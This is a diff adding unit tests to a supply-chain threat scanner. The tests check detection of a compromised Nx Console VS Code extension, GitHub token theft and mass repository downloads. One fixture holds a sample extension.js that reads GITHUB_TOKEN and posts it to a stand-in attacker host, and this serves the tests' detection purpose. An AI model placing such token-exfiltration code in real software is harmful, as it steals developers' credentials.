@@ -1234,6 +1234,76 @@ const https = require("https");
         self.assertNotIn("short-lived", packages)
         self.assertNotIn("cross-origin", packages)
 
+    def test_campaign_intake_extracts_vscode_extension_and_github_breach_signals(self):
+        text = (
+            "Compromised Nx Console 18.95.0 targeted VS Code developers. "
+            "The extension fetched a payload from an orphan commit in github.com/nrwl/nx-console, "
+            "harvested GitHub tokens, and exfiltrated via HTTPS, the GitHub API, and DNS tunneling. "
+            "Users should update to 18.100.0."
+        )
+        payload = supply_chain.campaign_intake(
+            text=text,
+            source_name="GitHub Security Advisory",
+            source_url="https://github.com/nrwl/nx-console/security/advisories/GHSA-c9j4-9m59-847w",
+        )
+        packages = {(item["ecosystem"], item["package"], item["version"]) for item in payload["campaign"]["packages"]}
+        behaviors = " ".join(payload["campaign"]["behavioral_indicators"]).lower()
+        self.assertIn(("open-vsx", "nrwl.angular-console", "18.95.0"), packages)
+        self.assertIn(("github", "nrwl/nx-console", "unknown"), packages)
+        self.assertIn("vs code extension", behaviors)
+        self.assertIn("orphan commit", behaviors)
+        self.assertIn("github token", behaviors)
+
+    def test_open_vsx_fixture_detects_extension_activation_and_credential_theft(self):
+        payload = supply_chain.analyze_ecosystem_files(
+            "open-vsx",
+            {
+                "package.json": json.dumps({
+                    "name": "angular-console",
+                    "publisher": "nrwl",
+                    "version": "18.95.0",
+                    "activationEvents": ["workspaceContains:**/nx.json"],
+                }),
+                "extension.js": (
+                    "const vscode=require('vscode'); const cp=require('child_process'); "
+                    "const token=process.env.GITHUB_TOKEN; "
+                    "fetch('https://attacker.example/upload',{method:'POST',body:token}); "
+                    "cp.spawn('python',['cat.py']);"
+                ),
+            },
+        )
+        joined = "\n".join(payload["findings"]).lower()
+        self.assertIn("broad activation", joined)
+        self.assertIn("credential harvesting", joined)
+        self.assertIn("github dead-drop", joined)
+        self.assertGreater(payload["score"], 0)
+
+    def test_github_event_fixture_detects_token_and_mass_repo_download(self):
+        payload = supply_chain.analyze_ecosystem_files(
+            "github",
+            {
+                "audit-event.json": json.dumps({
+                    "actor": "compromised-workflow",
+                    "token": "GITHUB_TOKEN",
+                    "action": "downloaded repositories through api.github.com/repos/org/private/zipball",
+                    "detail": "orphan commit and Git Data API create blob/create tree activity observed",
+                })
+            },
+        )
+        joined = "\n".join(payload["findings"]).lower()
+        self.assertIn("github token", joined)
+        self.assertIn("repository enumeration", joined)
+        self.assertIn("orphan commit", joined)
+
+    def test_missed_threat_advisories_match_source_backed_versions(self):
+        durabletask = supply_chain.check_advisory("pypi", "durabletask", "1.4.2")
+        nx_console = supply_chain.check_advisory("open-vsx", "nrwl.angular-console", "18.95.0")
+        grafana = supply_chain.check_advisory("github", "grafana/grafana", "2026-05")
+        self.assertTrue(durabletask["matched"])
+        self.assertTrue(nx_console["matched"])
+        self.assertTrue(grafana["matched"])
+        self.assertEqual(nx_console["matches"][0]["safe_versions"], ["18.100.0"])
+
     def test_campaign_watchlist_add_and_list_uses_runtime_path(self):
         with tempfile.TemporaryDirectory() as temp_dir:
             path = Path(temp_dir) / "watchlist.json"
@@ -1259,6 +1329,19 @@ const https = require("https");
             payload = supply_chain.discover_campaigns(since="24h", limit=10)
         self.assertEqual(payload["total_candidates"], 1)
         self.assertGreaterEqual(payload["candidates"][0]["score"], 35)
+        self.assertEqual(payload["source_status"][0]["status"], "ok")
+        self.assertEqual(payload["source_status"][0]["items"], 2)
+
+    def test_discover_campaigns_reports_source_failures_structurally(self):
+        with tempfile.TemporaryDirectory() as temp_dir, \
+            mock.patch.object(supply_chain, "CAMPAIGN_CANDIDATES_PATH", Path(temp_dir) / "candidates.json"), \
+            mock.patch.object(supply_chain, "_load_discovery_sources", return_value=[{"name": "Broken Feed", "feed_url": "https://example.com/feed.xml", "type": "rss", "poll_frequency_hint": "hourly"}]), \
+            mock.patch.object(supply_chain, "_http_text", side_effect=TimeoutError("unit timeout")), \
+            mock.patch.object(supply_chain, "_cached_news_items", return_value=[]):
+            payload = supply_chain.discover_campaigns(since="24h", limit=10)
+        self.assertEqual(payload["total_candidates"], 0)
+        self.assertEqual(payload["source_status"][0]["status"], "error")
+        self.assertIn("unit timeout", payload["errors"][0]["error"])
 
     def test_campaign_autopilot_dry_run_does_not_persist(self):
         candidate = supply_chain.campaign_intake(
